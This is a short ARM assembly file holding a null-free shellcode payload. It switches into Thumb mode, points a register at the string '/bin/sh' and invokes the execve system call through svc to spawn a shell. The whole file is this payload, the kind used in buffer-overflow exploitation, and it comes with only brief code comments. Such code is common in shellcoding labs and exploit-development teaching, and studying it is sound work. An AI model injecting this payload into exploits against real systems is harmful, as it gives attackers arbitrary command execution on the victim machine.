.global _start

.text

_start:
	.code 32
	add r3, pc, #1
	bx r3			// bx to thumb
	
thumb:
	.code 16
	add r0, pc, #8		// address of string "/bin/shA"
	eor r1, r1		// r1 = 0
	eor r2, r2		// r2 = 0
	mov r7, #11		// execve
	svc #1			// call int

	.ascii "\a\a/bin/sh\0"
